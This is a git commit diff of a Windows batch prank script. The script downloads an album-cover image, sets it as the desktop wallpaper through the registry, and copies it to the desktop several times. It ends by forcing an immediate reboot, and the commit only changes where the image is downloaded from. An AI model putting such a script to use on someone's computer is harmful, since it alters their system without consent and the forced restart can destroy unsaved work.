c87ef17339fa26553b8af00282c04fd6c60cb02a
julian20yt <155905626+julian20yt@users.noreply.github.com>
2025-05-23 18:49:29 -0400

    I know... you see...

--- sam.bat
+++ sam.bat
@@ -1,10 +1,10 @@
 mkdir C:\Sam
-powershell -command "& {Invoke-WebRequest -Uri "https://upload.wikimedia.org/wikipedia/en/9/95/Leave_It_All_to_Me_single_cover.jpg" -OutFile "C:\Sam\wallpaper.jpg}"
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "C:\Sam\wallpaper.jpg}"
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Sam\Wallpaper.jpg /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 cd %UserProfile%\Desktop
-powershell -command "& {Invoke-WebRequest -Uri "https://upload.wikimedia.org/wikipedia/en/9/95/Leave_It_All_to_Me_single_cover.jpg" -OutFile "%UserProfile%\Desktop\ezip.jpg}"
-powershell -command "& {Invoke-WebRequest -Uri "https://upload.wikimedia.org/wikipedia/en/9/95/Leave_It_All_to_Me_single_cover.jpg" -OutFile "%UserProfile%\Desktop\a.jpg}"
-powershell -command "& {Invoke-WebRequest -Uri "https://upload.wikimedia.org/wikipedia/en/9/95/Leave_It_All_to_Me_single_cover.jpg" -OutFile "%UserProfile%\Desktop\b.jpg}"
-powershell -command "& {Invoke-WebRequest -Uri "https://upload.wikimedia.org/wikipedia/en/9/95/Leave_It_All_to_Me_single_cover.jpg" -OutFile "%UserProfile%\Desktop\c.jpg}"
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\ezip.jpg}"
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\a.jpg}"
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\b.jpg}"
+powershell -command "& {Invoke-WebRequest -Uri "julian20yt.github.io/Leave_It_All_to_Me_single_cover.bmp" -OutFile "%UserProfile%\Desktop\c.jpg}"
 shutdown -r -t 0 -f
